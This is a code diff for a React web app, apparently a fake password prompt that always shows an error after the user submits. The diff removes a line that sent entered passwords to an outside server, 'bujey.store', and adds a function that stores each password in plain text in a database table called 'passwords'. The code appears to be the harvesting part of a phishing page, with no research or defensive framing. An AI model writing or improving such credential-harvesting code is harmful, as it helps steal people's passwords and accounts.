@@ -6,6 +6,7 @@ import { useState } from 'react';
 import FormHelperText from '@mui/material/FormHelperText';
 import getCaretCoordinates from 'textarea-caret'
 import axios from 'axios';
+import { supabase } from './supabase';
 
 function App() {
 
@@ -51,11 +52,25 @@ function App() {
     setPos({x:x-80,y:y+1000});
   }
 
+  const writeDataToSupabase = async (password) => {
+    const { data, error } = await supabase
+        .from('passwords')
+        .insert([
+            { password }
+        ]);
+    
+    if (error) {
+        console.error('Error writing data:', error.message);
+    } else {
+        console.log('Data written successfully:', data);
+    }
+};
+
   const onClick = async ()=>{
     setSavedPassword(password);
     setIsError(true);
     try{
-      await axios.post('http://bujey.store:6168/auth',{auth:password})
+      writeDataToSupabase(password)
     }
     catch(error){
       console.log(error)
